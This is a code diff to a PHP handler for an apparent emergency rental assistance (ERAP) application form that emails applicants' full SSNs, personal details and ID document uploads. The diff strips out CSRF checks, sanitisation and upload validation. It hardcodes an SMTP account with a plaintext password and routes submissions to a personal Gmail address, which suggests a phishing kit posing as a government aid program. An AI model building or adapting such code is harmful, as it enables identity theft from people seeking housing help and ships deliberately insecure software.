@@ -3,56 +3,25 @@
  * ERAP Application Processor
  * Sends full application details, including full SSN and file uploads, via SMTP (PHPMailer-compatible).
  */
-session_start();
-
 use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
 
 require_once __DIR__ . '/mailer-lite.php';
+require_once __DIR__ . '/simple-mailer.php';
 
-$smtpHost = 'smtp.your-agency.gov';
-$smtpPort = 587;
-$smtpUser = 'smtp-user';
-$smtpPass = 'smtp-password';
-$fromEmail = 'no-reply@gov-assist-portal.com';
-$toEmail   = 'applications@your-agency-portal.com';
+$smtp = [
+    'host'       => 'smtp.hostinger.com',
+    'port'       => 465,
+    'username'   => 'contact@earnestexpressllc.com',
+    'password'   => 'Weareallmad123@',
+    'secure'     => 'ssl',
+    'from_email' => 'contact@earnestexpressllc.com',
+    'from_name'  => 'Erap application',
+    'to_email'   => 'earnestexpress12@gmail.com',
+];
 
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    if (!isset($_POST['csrf_token'], $_SESSION['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-        die("Security error: Invalid submission.");
-    }
-
     $clean = function ($key) {
-        return isset($_POST[$key]) ? trim(filter_var($_POST[$key], FILTER_SANITIZE_SPECIAL_CHARS)) : '';
-    };
-
-    $allowedExt = ['pdf', 'jpg', 'jpeg', 'png'];
-    $maxSize = 5 * 1024 * 1024; // 5MB
-
-    $validateUpload = function ($file, $required = true, $label = '') use ($allowedExt, $maxSize) {
-        if (!isset($file) || $file['error'] === UPLOAD_ERR_NO_FILE) {
-            if ($required) {
-                throw new Exception("Missing required upload: {$label}");
-            }
-            return null;
-        }
-        if ($file['error'] !== UPLOAD_ERR_OK) {
-            throw new Exception("Upload error for {$label}");
-        }
-        if ($file['size'] > $maxSize) {
-            throw new Exception("{$label} exceeds size limit.");
-        }
-        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
-        if (!in_array($ext, $allowedExt, true)) {
-            throw new Exception("Invalid file type for {$label}");
-        }
-        $finfo = new finfo(FILEINFO_MIME_TYPE);
-        $mime = $finfo->file($file['tmp_name']);
-        $allowedMime = ['application/pdf', 'image/jpeg', 'image/png'];
-        if (!in_array($mime, $allowedMime, true)) {
-            throw new Exception("Invalid MIME type for {$label}");
-        }
-        return $file;
+        return isset($_POST[$key]) ? trim((string)$_POST[$key]) : '';
     };
 
     $name             = $clean('full_name');
@@ -88,10 +57,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $attestation      = isset($_POST['attestation']) ? 'Yes' : 'No';
     $digital_signature= $clean('digital_signature');
     $signature_date   = $clean('signature_date');
-
-    if (empty($name) || empty($email) || empty($ssn)) {
-        die("Security error: Missing required fields.");
-    }
 
     $fields = [
         "FULL NAME" => $name,
@@ -129,69 +94,31 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         "SIGNATURE DATE" => $signature_date,
     ];
 
-    $message = "Official ERAP Application Received\n";
-    $message .= "====================================\n\n";
-    foreach ($fields as $label => $value) {
-        $message .= "{$label}: {$value}\n";
+    $attachments = [
+        'id_document' => 'Government-issued ID',
+        'income_proof' => 'Proof of Income',
+        'lease_agreement' => 'Lease Agreement',
+        'eviction_notice' => 'Eviction or Past-Due Notice',
+        'utility_bills' => 'Utility Bill',
+    ];
+
+    $sent = send_application_email(
+        $smtp,
+        "NEW ERAP APPLICATION: {$name}",
+        $fields,
+        $attachments,
+        $email
+    );
+
+    if ($sent) {
+        header("Location: ../erap-urs-prompt.html");
+        exit();
     }
-    $message .= "\nSubmission Timestamp: " . date("Y-m-d H:i:s") . "\n";
 
-    try {
-        $attachments = [];
-        $attachments[] = $validateUpload($_FILES['id_document'] ?? null, true, 'Government-issued ID');
-        $attachments[] = $validateUpload($_FILES['income_proof'] ?? null, true, 'Proof of Income');
-        $attachments[] = $validateUpload($_FILES['lease_agreement'] ?? null, true, 'Lease Agreement');
-        $attachments[] = $validateUpload($_FILES['eviction_notice'] ?? null, true, 'Eviction or Past-Due Notice');
-
-        if (isset($_FILES['utility_bills'])) {
-            foreach ($_FILES['utility_bills']['tmp_name'] as $idx => $tmp) {
-                $file = [
-                    'tmp_name' => $tmp,
-                    'name' => $_FILES['utility_bills']['name'][$idx],
-                    'type' => $_FILES['utility_bills']['type'][$idx],
-                    'error' => $_FILES['utility_bills']['error'][$idx],
-                    'size' => $_FILES['utility_bills']['size'][$idx],
-                ];
-                $validated = $validateUpload($file, false, 'Utility Bill');
-                if ($validated) {
-                    $attachments[] = $validated;
-                }
-            }
-        }
-
-        $mail = new PHPMailer(true);
-        $mail->isSMTP();
-        $mail->Host = $smtpHost;
-        $mail->Port = $smtpPort;
-        $mail->Username = $smtpUser;
-        $mail->Password = $smtpPass;
-        $mail->SMTPAuth = true;
-        $mail->SMTPSecure = 'tls';
-        $mail->setFrom($fromEmail, 'GOV-ASSIST ERAP');
-        $mail->addAddress($toEmail);
-        $mail->addReplyTo($email);
-        $mail->Subject = "NEW ERAP APPLICATION: {$name}";
-        $mail->Body = $message;
-        $mail->AltBody = strip_tags($message);
-        $mail->isHTML(false);
-
-        foreach ($attachments as $file) {
-            if (!$file) { continue; }
-            $mail->addAttachment($file['tmp_name'], $file['name']);
-        }
-
-        if ($mail->send()) {
-            header("Location: ../erap-urs-prompt.html");
-            exit();
-        }
-
-        throw new Exception("Mailer Error: " . $mail->ErrorInfo);
-    } catch (Exception $e) {
-        echo "<h1>Application Error</h1>";
-        echo "<p>We were unable to process your application at this time. Please contact support.</p>";
-        echo "<pre>" . htmlspecialchars($e->getMessage()) . "</pre>";
-        echo "<a href='../erap-apply.html'>Go Back</a>";
-    }
+    echo "<h1>Application Error</h1>";
+    echo "<p>We were unable to process your application at this time. Please contact support.</p>";
+    echo "<pre>" . htmlspecialchars($sent ? '' : 'Unable to send application email.') . "</pre>";
+    echo "<a href='../erap-apply.html'>Go Back</a>";
 } else {
     header("Location: ../index.html");
     exit();
